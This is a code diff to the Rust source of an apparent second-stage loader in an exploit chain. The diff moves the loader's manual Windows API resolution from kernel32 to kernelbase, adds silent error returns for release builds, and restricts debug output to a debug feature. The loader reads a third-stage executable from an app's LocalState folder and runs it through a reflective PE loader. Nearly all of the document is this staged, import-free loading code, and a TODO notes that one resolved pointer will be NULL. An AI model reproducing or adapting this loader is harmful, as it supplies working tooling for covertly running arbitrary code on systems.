@@ -17,9 +17,11 @@ fn panic(_info: &PanicInfo) -> ! {
 }
 
 const STAGE3_ENV_FILENAME: &str = concat!(r#"%LOCALAPPDATA%\..\LocalState\run.exe"#, "\0");
+const STAGE2_ERROR_FILE_OPEN_FAILED: u64 = 0x200000000_00000001;
+const STAGE2_ERROR_FILE_READ_FAILED: u64 = 0x200000000_00000002;
 
 #[no_mangle]
-pub extern "C" fn main() -> u32 {
+pub extern "C" fn main() -> u64 {
     // unsafe {
     //     asm!("int 3");
     // }
@@ -30,9 +32,10 @@ pub extern "C" fn main() -> u32 {
     //     asm!("mov rcx, 0", "mov rdx, 0",);
     // }
 
-    let kernel32_ptr = get_kernel32();
+    let kernelbase_ptr = get_kernelbase().unwrap();
 
-    let OutputDebugStringA = fetch_output_debug_string(kernel32_ptr);
+    #[cfg(feature = "debug")]
+    let OutputDebugStringA = fetch_output_debug_string(kernelbase_ptr);
     macro_rules! debug_print {
         ($msg:expr) => {
             #[cfg(feature = "debug")]
@@ -44,17 +47,18 @@ pub extern "C" fn main() -> u32 {
 
     debug_print!("Hello from stage2");
 
-    let ReadFile = fetch_read_file(kernel32_ptr);
-    let CreateFileA = fetch_create_file(kernel32_ptr);
-    let VirtualAlloc = fetch_virtual_alloc(kernel32_ptr);
-    let VirtualProtect = fetch_virtual_protect(kernel32_ptr);
-    let GetFileSize = fetch_get_file_size(kernel32_ptr);
-    let GetProcAddress = fetch_get_proc_address(kernel32_ptr);
-    let LoadLibraryA = fetch_load_library(kernel32_ptr);
-    let CreateThread = fetch_create_thread(kernel32_ptr);
-    let RtlAddFunctionTable = fetch_rtl_add_fn_table(kernel32_ptr);
-    let GetModuleHandleA = fetch_get_module_handle(kernel32_ptr);
-    let ExpandEnvironmentStringsA = fetch_expand_environment_strings(kernel32_ptr);
+    let ReadFile = fetch_read_file(kernelbase_ptr);
+    let CreateFileA = fetch_create_file(kernelbase_ptr);
+    let VirtualAlloc = fetch_virtual_alloc(kernelbase_ptr);
+    let VirtualProtect = fetch_virtual_protect(kernelbase_ptr);
+    let GetFileSize = fetch_get_file_size(kernelbase_ptr);
+    let GetProcAddress = fetch_get_proc_address(kernelbase_ptr);
+    let LoadLibraryA = fetch_load_library(kernelbase_ptr);
+    let CreateThread = fetch_create_thread(kernelbase_ptr);
+    // TODO: this is kernel32, not kernelbase, so it will be NULL.
+    let RtlAddFunctionTable = fetch_rtl_add_fn_table(kernelbase_ptr);
+    let GetModuleHandleA = fetch_get_module_handle(kernelbase_ptr);
+    let ExpandEnvironmentStringsA = fetch_expand_environment_strings(kernelbase_ptr);
 
     let mut stage3_filename: MaybeUninit<[u8; 200]> = MaybeUninit::uninit();
     unsafe {
@@ -79,7 +83,11 @@ pub extern "C" fn main() -> u32 {
     };
 
     if handle as usize == usize::MAX {
+        #[cfg(not(feature = "debug"))]
+        return STAGE2_ERROR_FILE_OPEN_FAILED;
+
         debug_print!("Opening stage2 file failed, got INVALID_HANDLE_VALUE");
+
         debug_break!();
     }
 
@@ -104,7 +112,12 @@ pub extern "C" fn main() -> u32 {
                 core::ptr::null_mut(),
             ) == 0
             {
+                #[cfg(not(feature = "debug"))]
+                return STAGE2_ERROR_FILE_READ_FAILED;
+
                 debug_print!("Reading stage3 failed");
+
+                #[cfg(feature = "debug")]
                 debug_break!();
             }
             write_ptr = write_ptr.offset(bytes_read as _);
@@ -117,6 +130,7 @@ pub extern "C" fn main() -> u32 {
 
     // unsafe { asm!("int 3") };
 
+    debug_print!("Attempting to load PE");
     unsafe {
         solstice_loader::reflective_loader(
             pe_data,
